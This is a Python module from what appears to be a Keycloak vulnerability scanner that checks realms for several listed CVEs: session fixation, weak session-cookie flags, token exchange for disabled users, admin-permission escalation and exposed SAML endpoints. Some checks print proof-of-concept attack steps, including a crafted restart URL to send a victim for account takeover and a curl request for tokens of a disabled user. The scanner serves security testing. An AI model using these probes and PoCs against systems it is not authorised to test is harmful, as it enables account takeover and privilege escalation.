#!/usr/bin/env python3

import re
import requests as _requests

from utils.style import Colors, Identify
from utils.output import get_reporter


def _get_base_and_realm(realm_url: str):
    """Split 'https://host/auth/realms/master' → (base='https://host/auth', realm_name='master')."""
    realm_url = realm_url.rstrip('/')
    if "/realms/" in realm_url:
        base, _, realm_name = realm_url.rpartition("/realms/")
        return base, realm_name
    return realm_url, realm_url.split("/")[-1]


def _check_session_fixation(s, realm, client_id, reporter):
    """CVE-2026-7507: /login-actions/restart missing CSRF + cookie binding."""
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={"client_id": client_id, "response_type": "code",
                    "redirect_uri": f"{realm}/callback"},
            allow_redirects=True,
        )
        m_code = re.search(r'[?&]session_code=([^&"\']+)', r.url)
        m_tab  = re.search(r'[?&]tab_id=([^&"\']+)', r.url)
        if not m_code:
            m_code = re.search(r'session_code=([^&"\'&amp;]+)', r.text)
            m_tab  = re.search(r'tab_id=([^&"\'&amp;]+)', r.text)
        if not m_code:
            return

        session_code = m_code.group(1)
        tab_id = m_tab.group(1) if m_tab else "tab"

        fresh = _requests.Session()
        fresh.verify = False
        r2 = fresh.get(
            f"{realm}/login-actions/restart",
            params={"session_code": session_code, "client_id": client_id, "tab_id": tab_id},
            allow_redirects=False,
        )

        loc = r2.headers.get("Location", "")
        is_vuln = False
        if r2.status_code in (301, 302, 303) and "error" not in loc.lower():
            if any(k in loc for k in ("login-actions", "authenticate", "execution")):
                is_vuln = True
        elif r2.status_code == 200 and ("password" in r2.text.lower() or "username" in r2.text.lower()):
            is_vuln = True

        if is_vuln:
            print(f"  └── {Identify.confirmed}")
            print(f"       CVE-2026-7507: /login-actions/restart accepts session_code without cookie binding")
            print(f"       HTTP {r2.status_code}{(' → ' + loc[:100]) if loc else ''}")
            print(f"       Attack: pre-stage a session, send victim the restart URL,")
            print(f"               victim's SSO cookie completes YOUR auth flow → account takeover")
            print(f"       {Colors.THISTLE}PoC:{Colors.RESET}")
            print(f"         # 1. Capture session_code from auth flow URL")
            print(f"         # 2. Send victim: {realm}/login-actions/restart")
            print(f"         #    ?session_code={session_code}&client_id={client_id}&tab_id={tab_id}")
            if reporter:
                reporter.add("SessionSecurity", "high",
                             "CVE-2026-7507: Session fixation via /login-actions/restart",
                             f"{realm}/login-actions/restart",
                             "Pre-auth ATO: attacker pre-stages session, victim's SSO authenticates into it")
        else:
            print(f"  └── {Colors.GREEN}[OK]{Colors.RESET} /login-actions/restart rejected cross-session handle")
    except Exception:
        pass


def _check_auth_session_cookie(s, realm, client_id, reporter):
    """CVE-2025-12390 surface: AUTH_SESSION_ID cookie without SameSite/Secure flags."""
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={"client_id": client_id, "response_type": "code",
                    "redirect_uri": f"{realm}/callback"},
            allow_redirects=True,
        )
        raw_cookies = r.headers.get("Set-Cookie", "")
        if "AUTH_SESSION_ID" not in raw_cookies.upper():
            return

        flags = []
        for line in raw_cookies.split("\n"):
            if "AUTH_SESSION" not in line.upper():
                continue
            low = line.lower()
            if "secure" not in low:
                flags.append("missing Secure")
            if "samesite" not in low:
                flags.append("missing SameSite")
            elif "samesite=none" in low:
                flags.append("SameSite=None")

        if flags:
            print(f"  └── {Identify.behavior}")
            print(f"       AUTH_SESSION_ID cookie: {', '.join(flags)}")
            print(f"       Increases CVE-2025-12390 exploitation surface:")
            print(f"       stale cookie reuse during multi-user / shared-browser scenarios → cross-user ATO")
            if reporter:
                reporter.add("SessionSecurity", "medium",
                             f"AUTH_SESSION_ID weak cookie flags: {', '.join(flags)}",
                             realm, "CVE-2025-12390: cookie reuse → wrong user identity in refreshed tokens")
    except Exception:
        pass


def _check_token_exchange(s, realm, client_id, reporter):
    """CVE-2025-14559: token exchange supported → test disabled user subject."""
    try:
        r = s.get(f"{realm}/.well-known/openid-configuration", allow_redirects=False)
        if r.status_code != 200:
            return
        grant_types = r.json().get("grant_types_supported", [])
        if "urn:ietf:params:oauth:grant-type:token-exchange" not in grant_types:
            return

        print(f"  └── {Identify.behavior}")
        print(f"       Token Exchange grant enabled — CVE-2025-14559 surface")
        print(f"       Flaw: endpoint doesn't validate whether requested_subject is an active user")
        print(f"       → tokens issued for disabled accounts")
        print(f"       {Colors.THISTLE}PoC (requires valid token):{Colors.RESET}")
        print(f"         curl -X POST '{realm}/protocol/openid-connect/token' \\")
        print(f"              -H 'Authorization: Bearer YOUR_TOKEN' \\")
        print(f"              -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \\")
        print(f"              -d 'requested_subject=DISABLED_USER_UUID' \\")
        print(f"              -d 'requested_token_type=urn:ietf:params:oauth:token-type:access_token'")
        if reporter:
            reporter.add("SessionSecurity", "medium",
                         "Token Exchange enabled — disabled user token issuance (CVE-2025-14559)",
                         realm, "Manual test with valid token required")
    except Exception:
        pass


def _check_fgapv2(s, realm, reporter):
    """CVE-2025-7784 / CVE-2026-9795: FGAPv2 enabled + admin API accessible."""
    base, realm_name = _get_base_and_realm(realm)
    candidates = [
        f"{base}/admin/realms/{realm_name}",
        f"{base.split('/auth')[0]}/admin/realms/{realm_name}",
    ]
    for admin_url in candidates:
        try:
            r = _requests.get(admin_url, verify=False, timeout=8)
            if r.status_code != 200:
                continue
            data = r.json()
            fgap = data.get("adminPermissionsEnabled", False)
            if fgap:
                print(f"  └── {Colors.RED}[HIGH]{Colors.RESET} FGAPv2 (Fine-Grained Admin Permissions) enabled + admin API accessible unauthenticated")
                print(f"       CVE-2025-7784: manage-users → realm-admin escalation")
                print(f"       CVE-2026-9795: manage-clients → assign realm-admin via scope mapping → role in user tokens")
                print(f"       Admin API: {admin_url}")
                if reporter:
                    reporter.add("SessionSecurity", "high",
                                 "FGAPv2 enabled + admin API unauthenticated (CVE-2025-7784 / CVE-2026-9795)",
                                 admin_url,
                                 "manage-clients permission → assign realm-admin to scope → privilege escalation")
            else:
                print(f"  └── {Colors.THISTLE}[INFO]{Colors.RESET} Admin API accessible ({admin_url}) — FGAPv2 not enabled")
            break
        except Exception:
            continue


def _check_saml_endpoints(s, realm, reporter):
    """CVE-2026-2092 / CVE-2026-3047: SAML endpoints exposure and disabled client bypass surface."""
    base, realm_name = _get_base_and_realm(realm)
    saml_endpoints = [
        f"{realm}/protocol/saml/descriptor",
        f"{base.split('/auth')[0]}/auth/realms/{realm_name}/protocol/saml/descriptor"
        if "/realms/" in realm else "",
    ]
    for ep in saml_endpoints:
        if not ep:
            continue
        try:
            r = s.get(ep, allow_redirects=False)
            if r.status_code == 200 and ("EntityDescriptor" in r.text or "saml" in r.text.lower()):
                print(f"  └── {Identify.behavior}")
                print(f"       SAML SP descriptor exposed: {ep}")
                print(f"       CVE-2026-2092 surface: encrypted assertion injection if SAML broker configured")
                print(f"       CVE-2026-3047 surface: disabled SAML client may still allow SSO bypass")
                if reporter:
                    reporter.add("SessionSecurity", "medium",
                                 "SAML SP descriptor exposed — assertion injection / disabled client bypass surface",
                                 ep,
                                 "CVE-2026-2092: encrypted assertion injection | CVE-2026-3047: disabled client SSO bypass")
                break
        except Exception:
            continue


def check_session_security(s, realms, client_ids):
    print(f"{Colors.CYAN} ├ Session & Token Security {Colors.RESET}")
    reporter = get_reporter()
    found_any = False

    test_client = client_ids[0] if client_ids else "account"

    for realm in realms:
        realm = realm.rstrip('/')
        print(f"  {Colors.THISTLE}[*] {realm}{Colors.RESET}")

        _check_session_fixation(s, realm, test_client, reporter)
        _check_auth_session_cookie(s, realm, test_client, reporter)
        _check_token_exchange(s, realm, test_client, reporter)
        _check_fgapv2(s, realm, reporter)
        _check_saml_endpoints(s, realm, reporter)

    if not reporter or not any(f["category"] == "SessionSecurity" for f in (reporter.findings or [])):
        print(f"  └── {Colors.THISTLE}No session security issues detected{Colors.RESET}")
